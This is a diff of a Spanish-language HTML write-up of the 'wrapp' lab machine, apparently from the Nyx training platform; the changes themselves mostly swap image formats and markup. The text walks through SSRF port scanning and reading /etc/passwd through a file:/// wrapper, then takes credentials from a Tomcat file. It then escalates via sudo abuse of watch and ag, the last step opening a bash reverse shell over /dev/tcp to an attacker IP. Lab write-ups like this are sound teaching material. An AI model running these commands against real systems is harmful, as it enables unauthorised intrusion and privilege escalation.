@@ -204,8 +204,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Summary   : Apache[2.4.38], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)]
 </span></span></code></pre></div><h3 id="puerto-80">Puerto 80</h3>
-<p><img src="/../machines/nyx/nyx_wrapp/tryharder.png" alt="tryharder"></p>
-<p>Enumerando con wfuzz encuentro el directorio <code>advanced-search</code>.</p>
+<p><img src="/../machines/nyx/wrapp/tryharder.webp" alt="tryharder"></p>
+<p>Enumerando con wfuzz encuentro el directorio <strong>advanced-search</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hw=2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.150/FUZZ
 </span></span><span style="display:flex;"><span>********************************************************
 </span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -220,8 +220,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>000001073:   301        9 L      28 W       319 Ch      &#34;javascript&#34;                                                                                                                                    
 </span></span><span style="display:flex;"><span>000006538:   301        9 L      28 W       324 Ch      &#34;advanced-search&#34; 
-</span></span></code></pre></div><p>Desde firefox visualizo el nuevo directorio encontrado y veo una herramienta de búsqueda.
-<img src="/../machines/nyx/nyx_wrapp/advanced-search.png" alt="advanced-search"></p>
+</span></span></code></pre></div><p>Desde firefox visualizo el nuevo directorio encontrado y veo una herramienta de búsqueda.</p>
+<p><img src="/../machines/nyx/wrapp/advanced-search.webp" alt="advanced-search"></p>
 <p>Hago una enumeración de puertos internos y encuentro el puerto 65000.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c --hw=0 -t 1 -z range,1-65535 &#34;http://192.168.1.150/advanced-search/path.php?path=localhost:FUZZ&#34;
 </span></span><span style="display:flex;"><span>********************************************************
@@ -238,11 +238,11 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>000000022:   200        2 L      4 W        60 Ch       &#34;22&#34;                                                                                                                                            
 </span></span><span style="display:flex;"><span>000000080:   200        1 L      2 W        20 Ch       &#34;80&#34;                                                                                                                                            
 </span></span><span style="display:flex;"><span>000065000:   200        29 L     211 W      1895 Ch     &#34;65000&#34;
-</span></span></code></pre></div><p>Al ser un puerto interno escribo lo siguiente.
-<img src="/../machines/nyx/nyx_wrapp/advanced-search-l-65000.png" alt="advanced-search-l-65000.png"></p>
-<p>Puedo observar una página web por defecto de tomcat. Al final de la página pone: Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>.</p>
-<p><img src="/../machines/nyx/nyx_wrapp/advanced-search-65000.png" alt="advanced-search-65000.png"></p>
-<p>Después de quedarme atascado en esta parte y gracias a una pista del sr <code>d4t4s3c</code> encuentro el wrapper <code>file:///</code>  que uso para ver el fichero en  <code>/etc/passwd</code>.</p>
+</span></span></code></pre></div><p>Al ser un puerto interno escribo lo siguiente.</p>
+<p><img src="/../machines/nyx/wrapp/advanced-search-l-65000.webp" alt="advanced-search-l-65000.png"></p>
+<p>Puedo observar una página web por defecto de tomcat. Al final de la página pone: Users are defined in <strong>/etc/tomcat9/tomcat-users.xml</strong>.</p>
+<p><img src="/../machines/nyx/wrapp/advanced-search-65000.webp" alt="advanced-search-65000.png"></p>
+<p>Después de quedarme atascado en esta parte y gracias a una pista del sr <strong>d4t4s3c</strong> encuentro el wrapper <strong>file:///</strong>  que uso para ver el fichero en  <strong>/etc/passwd</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#34;http://192.168.1.150/advanced-search/path.php?path=file%3A%2F%2F%2Fetc%2Fpasswd&#34;
 </span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
 </span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -272,21 +272,21 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 </span></span><span style="display:flex;"><span>henry:x:1001:1001::/home/henry:/bin/bash
 </span></span><span style="display:flex;"><span>tomcat:x:998:998:Apache Tomcat:/:/usr/sbin/nologin
-</span></span></code></pre></div><p>Uso curl de nuevo para ver el archivo <code>tomcat-users.xml</code> que anteriormente vi su ruta en la página interna de tomcat y encuentro las credenciales del usuario edward.
-<img src="/../machines/nyx/nyx_wrapp/edward-creds.png" alt="edward-creds"></p>
+</span></span></code></pre></div><p>Uso curl de nuevo para ver el archivo <strong>tomcat-users.xml</strong> que anteriormente vi su ruta en la página interna de tomcat y encuentro las credenciales del usuario edward.
+<img src="/../machines/nyx/wrapp/edward-creds.webp" alt="edward-creds"></p>
 <p>Me conecto a la máquina objetivo.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ssh edward@192.168.1.150
 </span></span><span style="display:flex;"><span>edward@192.168.1.150&#39;s password: 
 </span></span><span style="display:flex;"><span>Linux wrapp 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64
 </span></span><span style="display:flex;"><span>edward@wrapp:~$
-</span></span></code></pre></div><p>Enumerando todos los archivos con permisos de escritura veo que en el directorio <code>advanced-search</code> tengo permisos de escritura, lectura y ejecución.</p>
+</span></span></code></pre></div><p>Enumerando todos los archivos con permisos de escritura veo que en el directorio <strong>advanced-search</strong> tengo permisos de escritura, lectura y ejecución.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>edward@wrapp:~$ find / -writable 2&gt;/dev/null | grep -v -i -E &#39;proc&#39; | xargs ls -l
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>/var/www/html/advanced-search:
 </span></span><span style="display:flex;"><span>total 8
 </span></span><span style="display:flex;"><span>-rwxrwxrwx 1 root root 596 jul 27  2021 index.php
 </span></span><span style="display:flex;"><span>-rwxrwxrwx 1 root root 249 jul 27  2021 path.php
-</span></span></code></pre></div><p>Creo una shell en <code>advanced-search</code> y obtengo otra shell como usuario <code>www-data</code>.</p>
+</span></span></code></pre></div><p>Creo una shell en <strong>advanced-search</strong> y obtengo otra shell como usuario <strong>www-data</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 1234
 </span></span><span style="display:flex;"><span>listening on [any] 1234 ...
 </span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.150] 36358
@@ -307,7 +307,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User www-data may run the following commands on wrapp:
 </span></span><span style="display:flex;"><span>    (henry) NOPASSWD: /usr/bin/watch
-</span></span></code></pre></div><p>Para pivotar de <code>www-data</code> a <code>henry</code> he usado este recurso <a href="https://gtfobins.github.io/gtfobins/watch/#sudo">gtfobins</a>.</p>
+</span></span></code></pre></div><p>Para pivotar de <strong>www-data</strong> a <strong>henry</strong> he usado este recurso <a href="https://gtfobins.github.io/gtfobins/watch/#sudo">gtfobins</a>.</p>
 <p>Obtengo una shell como usuario henry.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@wrapp:/$ sudo -u henry /usr/bin/watch -x bash -c &#39;reset; exec bash 1&gt;&amp;0 2&gt;&amp;0&#39;
 </span></span><span style="display:flex;"><span>henry@wrapp:/$ id  
@@ -322,12 +322,12 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User henry may run the following commands on wrapp:
 </span></span><span style="display:flex;"><span>    (root) NOPASSWD: /usr/bin/ag
-</span></span></code></pre></div><p>Aquí le digo a <code>ag</code> que me busque la letra <code>c</code> dentro del fichero <code>root.txt</code> ubicado en <code>/root</code> , al mostrarme la flag me doy cuenta de que estoy usando bien la sintaxis del binario.</p>
+</span></span></code></pre></div><p>Aquí le digo a <strong>ag</strong> que me busque la letra <strong>c</strong> dentro del fichero <strong>root.txt</strong> ubicado en <strong>/root</strong> , al mostrarme la flag me doy cuenta de que estoy usando bien la sintaxis del binario.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>henry@wrapp:/$ sudo -u root /usr/bin/ag c /root/root.txt
 </span></span><span style="display:flex;"><span>sudo -u root /usr/bin/ag c /root/root.txt
 </span></span><span style="display:flex;"><span>sudo: unable to resolve host wrapp: Name or service not known
 </span></span><span style="display:flex;"><span>1:**************c**c**************
-</span></span></code></pre></div><p>Después de varios intentos y de leer el <code>man</code> de la herramienta consigo el root de la siguiente forma:</p>
+</span></span></code></pre></div><p>Después de varios intentos y de leer el <strong>man</strong> de la herramienta consigo el root de la siguiente forma:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>henry@wrapp:/$ sudo -u root /usr/bin/ag --pager &#34;/bin/bash -c \&#34;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.18/1337 0&gt;&amp;1\&#34;&#34;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>root@wrapp:~# id
